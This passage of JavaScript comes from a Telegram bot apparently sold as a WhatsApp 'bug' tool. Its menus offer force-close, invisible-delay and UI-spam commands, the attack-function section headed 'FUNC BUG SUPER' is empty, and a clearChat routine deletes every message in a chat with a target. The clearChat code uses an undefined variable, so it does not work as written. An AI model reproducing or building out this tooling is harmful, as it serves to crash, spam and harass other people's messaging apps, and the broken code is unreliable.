      caption: ResellerMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
});
bot.action('ngontol', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const ResellerMenu = `\`\`\`
╭─────────────────
┃ ✇ /𝗙𝗢𝗥𝗖𝗘𝗖𝗟𝗢𝗦𝗘
┃ ✇ /𝗗𝗘𝗟𝗔𝗬𝗜𝗡𝗩𝗜𝗦
┃ ✇ /𝗦𝗣𝗔𝗠𝗨𝗜
╰─────────────────
\`\`\``;

  const ownerKeyboard = [
    [{
    text: "「  𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥  」", 
    url: "https://t.me/HAIKALSTORERE"
    }, 
    {
    text: "「  𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗗𝗘𝗩  」",
    url: "https://t.me/infoscripteternal"
    }],
    [{
    text: "「 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨 」",
    callback_data: "main_menu"
    }]
  ];




  ctx.replyWithPhoto("https://files.catbox.moe/uyv1dx.jpg", {
      caption: ResellerMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
});
bot.action('owneronli', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const obfMenu = `\`\`\`
╭─────────────────
┃✇ /𝗔𝗗𝗗𝗔𝗗𝗠𝗜𝗡
┃✇ /𝗗𝗘𝗟𝗔𝗗𝗠𝗜𝗡
┃✇ /𝗖𝗘𝗞𝗨𝗦𝗘𝗥𝗦𝗖
┃✇ /𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗨𝗦𝗘𝗥
┃✇ /𝗔𝗗𝗗𝗣𝗔𝗜𝗥𝗜𝗡𝗚
╰─────────────────
\`\`\`
`;

  const ownerKeyboard = [
    [{
    text: "「  𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥  」", 
    url: "https://t.me/noxxasoloo"
    }, 
    {
    text: "「  𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗗𝗘𝗩  」",
    url: "https://t.me/infoscripteternal"
    }],
    [{
    text: "「 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨 」",
    callback_data: "main_menu"
    }]
  ];



  ctx.replyWithPhoto("https://files.catbox.moe/ym9s3o.jpg", {
      caption: obfMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
});
// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
  const mainMenuMessage = `\`\`\`
╭─[𖣘] 𝐁‌𝗢𝗧 𝗜𝗡𝗙𝗢 ]──≽
│• 𝗡𝗔𝗠𝗘 : 𝗘𝗧𝗘𝗥𝗡𝗔𝗟 𝗚𝗔𝗟𝗔𝗫𝗬
│• 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 : 𝟭.𝟬
╰────────────────≽
╭─[𖣘] 𝗜𝗡𝗙𝗢 𝗦𝗧𝗔𝗧𝗨𝗦 ]─≽
│  ɴᴀᴍᴇ ʙᴏᴛ : 𝗘𝗧𝗘𝗥𝗡𝗔𝗟 𝗚𝗔𝗟𝗔𝗫𝗬
│  ᴄʀᴇᴀᴛᴏʀ : @noxxasoloo @HAIKALSTORERE
│  ᴠᴇʀsɪ ʙᴏᴛ : 𝗩𝟭.𝟬
│  ᴀᴅᴍɪɴ : ${isAdminStatus ? '✅' : '❌'}
│  ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? '✅' : '❌'}
╰────────────────≽
\`\`\``;

  const mainKeyboard = [
    [{ 
    text: "「  𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮  」",
    callback_data: "ngontol"
    },
    { 
    text: "「  𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮  」",
    callback_data: "owneronli"
    }], 
    [{ 
    text: "「  𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥  」", 
    url: "https://t.me/noxxasoloo" 
    }], 
    [{
    text: "「  𝐀͢𝐝͡𝐦͜𝐢͢𝐧𝐌͜𝐞͢𝐧͡𝐮  」",
    callback_data: "admincmd"
    },
    {
    text: "「  𝐓͢𝐡͡𝐧𝐤𝐬𝐓͜𝐨  」", 
    callback_data: "bestfriend"
     }]
  ];



  ctx.replyWithPhoto("https://files.catbox.moe/48gyz9.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});
// Fungsi untuk menghapus semua pesan dari target
  async function clearChat(target) {
    try {
      // Format nomor ke format JID
      const targetJid = targetNumber.includes("@s.whatsapp.net")
        ? targetNumber
        : `${target}@s.whatsapp.net`;

      // Periksa apakah target ada di daftar kontak
      const chats = zephy.chats.get(targetJid);
      if (!chats) {
        console.log("Target chat tidak ditemukan!");
        return;
      }

      // Hapus semua pesan di chat target
      await zephy.modifyChat(targetJid, "delete");
      console.log(`Semua pesan dengan ${target} telah dihapus.`);
    } catch (error) {
      console.error("Gagal menghapus chat:", error);
    }
  }
//======================================//          
// FUNC BUG SUPER //
//======================================//


//======================================//   
// --- Jalankan Bot ---
(async () => {
    console.clear();
    console.log("Memeriksa security...");
    await initializeOctokit();
    await verifyBotToken();
    console.log("Sukses connected");
    bot.launch();
    console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT FROM OWNER/DEVELOPER"));
})();